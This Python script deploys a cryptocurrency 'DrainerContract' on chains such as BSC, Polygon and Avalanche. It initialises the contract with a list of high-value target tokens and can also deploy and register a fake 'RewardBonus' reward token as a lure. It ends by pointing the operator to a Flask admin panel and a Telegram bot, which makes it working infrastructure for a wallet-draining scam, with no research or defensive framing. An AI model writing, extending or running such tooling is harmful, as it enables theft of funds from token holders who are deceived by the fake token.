#!/usr/bin/env python3
"""
Deploy the DrainerContract and optionally a FakeToken to the specified chain.
"""
import json
import time
import sys
from pathlib import Path

from web3 import Web3

try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    from web3.middleware.proof_of_authority import ExtraDataToPOAMiddleware as geth_poa_middleware


# Add parent dir to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from backend.config import CHAIN_CONFIG, DEFAULT_CHAIN, YOUR_PRIVATE_KEY, YOUR_WALLET_ADDRESS
from backend.config import CONTRACTS_DIR
from backend.config import normalize_private_key


def load_compiled_contract(contract_name):
    """Load compiled contract JSON."""
    path = CONTRACTS_DIR / f"{contract_name}.json"
    if not path.exists():
        print(f"[!] Contract not compiled: {path}")
        print("[*] Run: python contracts/compile.py")
        sys.exit(1)
    with open(path) as f:
        return json.load(f)


def get_web3(chain_name=DEFAULT_CHAIN):
    """Initialize Web3 connection to the specified chain."""
    if chain_name not in CHAIN_CONFIG:
        print(f"[!] Unknown chain: {chain_name}")
        print(f"    Available: {list(CHAIN_CONFIG.keys())}")
        sys.exit(1)
    
    config = CHAIN_CONFIG[chain_name]
    w3 = Web3(Web3.HTTPProvider(config["rpc"]))
    
    # Inject PoA middleware for BSC/Polygon/Avalanche
    if chain_name in ("bsc", "polygon", "avalanche"):
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    
    if not w3.is_connected():
        print(f"[!] Cannot connect to {chain_name} at {config['rpc']}")
        sys.exit(1)
    
    print(f"[+] Connected to {chain_name} (chain_id: {config['chain_id']})")
    return w3, config


def deploy_contract(w3, contract_json, *args, private_key=None, gas=3000000):
    """Deploy a contract and return the address."""
    if private_key is None:
        private_key = YOUR_PRIVATE_KEY

    try:
        private_key = normalize_private_key(private_key)
    except ValueError as exc:
        print(f"[!] {exc}")
        sys.exit(1)

    account = w3.eth.account.from_key(private_key)
    sender = account.address
    
    print(f"[*] Deploying {contract_json['contractName']} from {sender}...")
    
    Contract = w3.eth.contract(
        abi=contract_json["abi"],
        bytecode=contract_json["bytecode"]
    )
    
    # Build constructor transaction
    constructor_txn = Contract.constructor(*args).build_transaction({
        "from": sender,
        "gas": gas,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(sender),
    })
    
    # Sign and send
    signed = account.sign_transaction(constructor_txn)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"[*] Waiting for deployment tx: {tx_hash.hex()}")
    
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    contract_address = receipt["contractAddress"]
    
    print(f"[+] {contract_json['contractName']} deployed at: {contract_address}")
    print(f"[+] Gas used: {receipt['gasUsed']}")
    
    return contract_address, receipt


def deploy_drainer(w3, config):
    """Deploy the DrainerContract."""
    drainer_json = load_compiled_contract("DrainerContract")
    address, receipt = deploy_contract(w3, drainer_json)
    
    # Get contract instance
    drainer = w3.eth.contract(address=address, abi=drainer_json["abi"])
    
    # Initialize target tokens
    tokens = config["high_value_tokens"]
    print(f"[*] Initializing {len(tokens)} target tokens...")
    
    account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
    tx = drainer.functions.initializeTargetTokens(tokens).build_transaction({
        "from": account.address,
        "gas": 500000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Target tokens initialized (tx: {tx_hash.hex()})")
    
    return address, drainer


def deploy_fake_token(w3, drainer_address, name="RewardBonus", symbol="RBONUS"):
    """Deploy a FakeRewardToken."""
    fake_json = load_compiled_contract("FakeRewardToken")
    address, receipt = deploy_contract(w3, fake_json, drainer_address)
    
    # Register with drainer
    drainer_json = load_compiled_contract("DrainerContract")
    drainer = w3.eth.contract(address=drainer_address, abi=drainer_json["abi"])
    
    account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
    tx = drainer.functions.registerFakeToken(address).build_transaction({
        "from": account.address,
        "gas": 100000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    })
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] FakeToken registered with drainer")
    
    return address


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Deploy drainer contracts")
    parser.add_argument("--chain", default=DEFAULT_CHAIN, choices=list(CHAIN_CONFIG.keys()))
    parser.add_argument("--deploy-fake", action="store_true", help="Also deploy a fake token")
    parser.add_argument("--token-name", default="RewardBonus", help="Fake token name")
    parser.add_argument("--token-symbol", default="RBONUS", help="Fake token symbol")
    args = parser.parse_args()
    
    w3, config = get_web3(args.chain)
    
    # Step 1: Deploy DrainerContract
    print("\n=== DEPLOYING DRAINER CONTRACT ===\n")
    drainer_address, drainer = deploy_drainer(w3, config)
    
    print(f"\n[✓] DrainerContract: {drainer_address}")
    print(f"    Explorer: {config['explorer']}/address/{drainer_address}")
    
    # Step 2: Optionally deploy FakeToken
    if args.deploy_fake:
        print("\n=== DEPLOYING FAKE TOKEN ===\n")
        fake_address = deploy_fake_token(w3, drainer_address, args.token_name, args.token_symbol)
        print(f"\n[✓] FakeRewardToken: {fake_address}")
        print(f"    Explorer: {config['explorer']}/address/{fake_address}")
    
    # Save deployment info
    deployment = {
        "chain": args.chain,
        "chain_id": config["chain_id"],
        "drainer_address": drainer_address,
        "fake_token_address": fake_address if args.deploy_fake else None,
        "explorer": config["explorer"],
        "rpc": config["rpc"],
        "timestamp": time.time(),
    }
    
    deploy_path = Path("deployment_info.json")
    with open(deploy_path, "w") as f:
        json.dump(deployment, f, indent=2)
    print(f"\n[+] Deployment info saved to {deploy_path}")
    print("[*] Next: Run the Flask admin panel and Telegram bot")
    print("    python backend/app.py")
    print("    python bot/telegram_bot.py")


if __name__ == "__main__":
    main()